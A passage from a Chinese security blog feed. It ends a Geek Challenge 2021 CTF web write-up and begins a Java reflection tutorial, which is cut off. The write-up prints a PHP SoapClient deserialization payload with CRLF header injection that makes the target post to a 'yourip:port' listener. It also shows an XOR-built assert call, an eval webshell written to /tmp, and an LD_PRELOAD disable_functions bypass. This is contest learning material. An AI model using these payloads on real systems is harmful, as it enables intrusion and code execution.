class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;message=iwantflag&amp;url=http://yourip:port&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>=unserialize(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fxxk</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$par0</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par3</span> = <span class="string">&#x27;unser&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$kelasi</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> fxxk();</span><br><span class="line"><span class="variable">$a</span>-&gt;par2=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跑出来直接去打就行，记得监听端口哦</p><p><img src="https://i.loli.net/2021/10/20/bzDiTocdmVnkSQ4.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/20/iFkSBDE8GqHTrUf.png" alt="image.png"></p><p>成功弹回flag，拿下</p><h2 id="22-easyGO"><a href="#22-easyGO" class="headerlink" title="#22.easyGO"></a>#22.easyGO</h2><p>题目地址：<a href="http://1.14.102.22:8001/">http://1.14.102.22:8001/</a></p><p><img src="https://i.loli.net/2021/11/15/Z8IWzSlfxKthE6N.png" alt="image.png"></p><p>看了这题目描述我就知道我不会了哈哈哈</p><h2 id="23-breakout"><a href="#23-breakout" class="headerlink" title="23.breakout"></a>23.breakout</h2><p>题目地址：<a href="http://1.14.102.22:8013/">http://1.14.102.22:8013/</a></p><p>一道异或构造<code>assert</code>，加上绕过<code>disable_functions</code>的题</p><p>首先源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 这些奇怪的符号是什么呢?字符串之间还能异或的吗?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v&#x27;</span>] ^ <span class="string">&#x27;!-__)^&#x27;</span>;</span><br><span class="line"><span class="comment">// ctf常见的验证码哦!纯数字呢</span></span><br><span class="line"><span class="keyword">if</span> (substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;auth&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) == <span class="string">&quot;666666&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到他给出的是六个字符，那我们也得想办法给出六个字符，然后异或一下异或出一个函数名<code>assert</code>，具体异或的原理及过程可以去看我的另一篇文章无数字字母RCE，那里面讲的很清楚，那这里就直接给出异或的结果了：<code>@^,:[*</code>，然后下面写个脚本爆破就完了，得到爆破出来的结果：<code>3185471</code></p><p><img src="https://i.loli.net/2021/11/02/Vb7kuARdEwe83Q9.png" alt="image.png"></p><p>然后就可以执行<code>php</code>代码了，先来个<code>phpinfo</code>看看</p><p><img src="https://i.loli.net/2021/11/03/Qo4ZpXSDBHC7gkR.png" alt="image.png"></p><p>发现它既有<code>disable_funtions</code>也有<code>openbase_dir</code>，只能访问<code>/var/www/html</code>和<code>/tmp</code>，而且经过检验只有<code>/tmp</code>目录有写入权限，那我们就尝试往里面写马试试，然后包含它就可以连接蚁剑了，<code>file_put_contents(&#39;/tmp/ma.php&#39;,&#39;&lt;?php eval($_POST[1]);&#39;);</code></p><p><img src="https://i.loli.net/2021/11/03/nHw8dMDTOk4ue5i.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/03/7zOJGYEITbuBNfy.png" alt="image.png"></p><p>这样就可以了，直接去连接蚁剑，记得加上<code>body</code>中的内容，像下图这样就可以了：</p><p><img src="https://i.loli.net/2021/11/09/4HlkZ7EUsMY38oe.png" alt="image.png"></p><p>进去之后直接到达<code>/tmp</code>目录下，利用绕<code>disable_functions</code>的常规方法就行了，把<code>php</code>文件和<code>so</code>文件上传上去到<code>/tmp</code>目录下，<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a>，这里有个很恶心的地方就是<code>mail</code>被<code>ban</code>掉了，得把<code>php</code>里面的<code>mail</code>改成<code>mb_send_mail</code>，然后就可以了</p><p><img src="https://i.loli.net/2021/11/03/9RskSbBEx67CvX2.png" alt="image.png"></p><p>找到<code>readflag</code>函数，直接执行它就完事儿</p><p><img src="https://i.loli.net/2021/11/03/Dhg9RlC8qLaOPIn.png" alt="image.png"></p><h2 id="24-validation"><a href="#24-validation" class="headerlink" title="#24.validation"></a>#24.validation</h2><p>题目地址：<a href="http://110.42.233.91:88/">http://110.42.233.91:88/</a></p><p><img src="https://i.loli.net/2021/11/15/y7Cr9NBTYS45hup.png" alt="image.png"></p><p>这道题其实或许可以试试的，但后面太忙了就没做了</p><p>总的来说这次极客大挑战题目质量都非常高，能从中学到很多有意思的东西，在此感谢<code>SYC</code>的师傅们的精心命题</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WP篇之极客大挑战2021-部分Web&quot;&gt;&lt;a href=&quot;#WP篇之极客大挑战2021-部分Web&quot; class=&quot;headerlink&quot; title=&quot;WP篇之极客大挑战2021(部分Web)&quot;&gt;&lt;/a&gt;WP篇之极客大挑战2021(部分Web)&lt;/h1&gt;&lt;p&gt;又到了一年一度的极客大挑战了，去年作为新生的我被这比赛杀的稀烂，今年虽然自己依然很菜，但起码能多做几道题出来了，能看到自己一步步成长还是挺开心的，接下来我就把做出来的Web题的WP写一下，总共做出了20个web题，打了&lt;code&gt;#&lt;/code&gt;号的就是还未做出的，希望大家一起交流学习&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之Java反射</title>
    <link href="https://arsenetang.github.io/2021/11/06/Java%E7%AF%87%E4%B9%8BJava%E5%8F%8D%E5%B0%84/"/>
    <id>https://arsenetang.github.io/2021/11/06/Java%E7%AF%87%E4%B9%8BJava%E5%8F%8D%E5%B0%84/</id>
    <published>2021-11-05T16:00:00.000Z</published>
    <updated>2021-11-06T11:59:59.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><p>最近<code>ctf</code>比赛打得太多了，现在看到<code>ctf</code>题就脑壳痛哈哈哈，就想着找点别的来学吧，换换脑筋；于是准备学学<code>Java</code>安全，后面去研究研究<code>Java</code>反序列化啥的，在学<code>Java</code>反序列化之前肯定得先学<code>Java</code>反射，虽然说学校老师讲过了但讲的太快而且难度也不太够，所以说自己重新学了学顺便来总结总结</p><span id="more"></span><h2 id="Java反射是啥"><a href="#Java反射是啥" class="headerlink" title="Java反射是啥"></a>Java反射是啥</h2><p><code>Java</code>反射就是说，对于任意的一个类，我们都可以通过反射获取这个类中所有的属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制</p><p><img src="https://i.loli.net/2021/11/06/da2PXTGytkjKbqo.png" alt="image.png"></p><p>通过<code>Class</code>类对象来获取<code>Student</code>和<code>Teacher</code>类中的成员变量和成员方法，而不是直接通过创建<code>Student</code>和<code>Teacher</code>类对象，这就叫反射</p><p><code>Student</code>类代码如下，接下来的所有测试操作都基于这段代码，这段代码是从黑马程序员那偷的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Student</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    Student(String name,<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age,String address)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method:&quot;</span>+s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method3</span><span class="params">(String s,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s + <span class="string">&quot;,&quot;</span> + i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, address=&#x27;&quot;</span> + address + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="获取Class类对象"><a href="#获取Class类对象" class="headerlink" title="获取Class类对象"></a>获取Class类对象</h2><p>既然我们想通过反射去使用一个类，那我们首先就得获取该那个类的字节码文件对象，也就是类型为<code>Class</code>的对象，一般来讲我们有三种方法来获取，具体如下：</p><p>1.第一种是直接使用该类的<code>class</code>属性来获取该类对应的<code>Class</code>对象，就像<code>Student.class</code>返回<code>Student</code>类所对应的<code>Class</code>对象，但这种方法不太实用，因为如果不在一个包下，使用之前就需要先导入类的包，依赖性太强</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.testforclass.Student;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu1 = Student.class;</span><br><span class="line">        System.out.println(stu1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.第二种是先创建一个该类的对象，再调用该对象中的<code>getClass()</code>方法，就可以返回该对象所属类中的<code>Class</code>对象；这种方法我觉得就更离谱了，既然我们都已经创建该类的对象了，那直接用这个对象就好了啊，反射还有啥意义呢哈哈哈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        Class&lt;?&gt; stu2 = student.getClass();</span><br><span class="line">        System.out.println(stu2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.第三种方法是直接使用<code>Class</code>类中的静态方法<code>forName(String className)</code>，该方法需要传入字符串参数，该字符串参数的值是某个类的全路径，也就是完整包名的路径；这种方法是最实用的，灵活性也最高，所以说我们一般就用这种方法就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">       Class&lt;?&gt; stu3 = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">       System.out.println(stu3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看运行结果，肯定都是一样的：</p><p><img src="https://i.loli.net/2021/11/06/Z1QhNzo9n65rBJe.png" alt="image.png"></p><h2 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h2><p>当我们已经获取到一个<code>Class</code>对象之后，我们肯定得想办法获取到它的构造方法，毕竟创建一个对象是需要构造方法的嘛</p><p>在<code>Class</code>类中，提供了四种方法来获取构造方法，分别如下：</p><p>1.返回所有<strong>公共</strong>构造方法对象的数组：<code>getConstructors()</code>，这个它只能返回<code>public</code>的构造方法，它的返回值是一个数组，我们可以用一个加强<code>for</code>循环来遍历它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; [] cons = stu.getConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor con : cons)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/Qv9u2zYZlxosNOV.png" alt="image.png"></p><p>就返回了无参和带参两个构造方法，这俩都是<code>public</code>的</p><p>2.返回<strong>所有构造方法</strong>对象的数组：<code>getDeclaredConstructors()</code>，这个它就会返回所有的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; [] cons = stu.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor con : cons)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/rIF52XkgwpalU1G.png" alt="image.png"></p><p>就返回了四个构造方法，其中两个公有，一个私有还有一个默认</p><p>3.前面两种方法它都是返回的数组，都需要遍历，就很不方便，有没有方法它返回的是单个的呢？毫无疑问是有的，比如说返回<strong>单个公共</strong>构造方法对象的：<code>getConstructor()</code>，这里面是有参数的，通过这个参数来判断是哪个构造方法，如果不填参数的话就是无参构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; con1 = stu.getConstructor();</span><br><span class="line">        Constructor&lt;?&gt; con2 = stu.getConstructor(String.class,<span class="keyword">int</span>.class,String.class);</span><br><span class="line">        System.out.println(con1);</span><br><span class="line">        System.out.println(con2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/rht4jU29P76xen1.png" alt="image.png"></p><p>4.返回<strong>单个构造方法</strong>对象的：<code>getDeclaredConstructor()</code>，这个用法和上面的是一样的，只不过私有构造方法对象和默认构造方法对象它都能返回罢了，所以说一般来说我们就用这个就行，记得在里面加上参数哈</p><h2 id="利用构造方法创建对象"><a href="#利用构造方法创建对象" class="headerlink" title="利用构造方法创建对象"></a>利用构造方法创建对象</h2><p>既然我们有了构造方法，我们肯定就想着用构造方法来创建对象了，而在<code>Constructor</code>类中正好有拿来创建对象的方法：<code>newInstance</code>；创建方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; con2 = stu.getDeclaredConstructor(String.class,<span class="keyword">int</span>.class,String.class);</span><br><span class="line">        System.out.println(con2);</span><br><span class="line">        Object obj = con2.newInstance(<span class="string">&quot;Arsene.Tang&quot;</span>,<span class="number">18</span>,<span class="string">&quot;中国&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是公有的构造方法，那么直接用这种方法就行，<code>构造方法对象.newInstance()</code>里面直接加上需要的参数就行</p><p><img src="https://i.loli.net/2021/11/06/KPaoDAkleqHmvLx.png" alt="image.png"></p><p>如果是私有的构造方法，那么直接这样创建就不行了，会报错，因为私有的方法肯定不能直接用嘛，但我们可以使用暴力反射嘛，就是在前面先把构造方法的<code>Accessible</code>设置为<code>true</code>，让它不检测就行，具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; con2 = stu.getDeclaredConstructor(String.class);</span><br><span class="line">        System.out.println(con2);</span><br><span class="line">        con2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = con2.newInstance(<span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/U6zjtbraiWsh17Y.png" alt="image.png"></p><p>这样子就行啦，就可以愉快的创建对象了</p><h2 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h2><p>那接下来我们看看能不能获取类中的成员变量呢，那肯定也是可以的，又去<code>Class</code>类中找方法</p><p>同样的，<code>Class</code>类中获取成员变量的方法也是四种；同样也是两个返回数组两个返回单个的；同样也是两个返回<strong>公共成员变量对象</strong>两个返回<strong>所有成员变量对象</strong></p><p>1.返回所有<strong>公共成员变量对象</strong>的<strong>数组</strong>：<code>getFields()</code>，同样的，返回的是数组，那么我们还是用一个加强<code>for</code>循环来遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Field []fields = stu.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field : fields)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/492KMtj1PSCiFof.png" alt="image.png"></p><p>就返回了唯一一个公有的成员变量：<code>address</code></p><p>2.返回<strong>所有成员变量对象</strong>的<strong>数组</strong>：<code>getDeclaredFields()</code>，用法和上面完全一样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Field []fields = stu.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field : fields)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/RzpJHLIy7goD1FS.png" alt="image.png"></p><p>就把三个成员变量都返回了</p><p>3.返回<strong>单个公共成员</strong>变量对象：<code>getField(String name)</code>：里面的参数为变量名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> 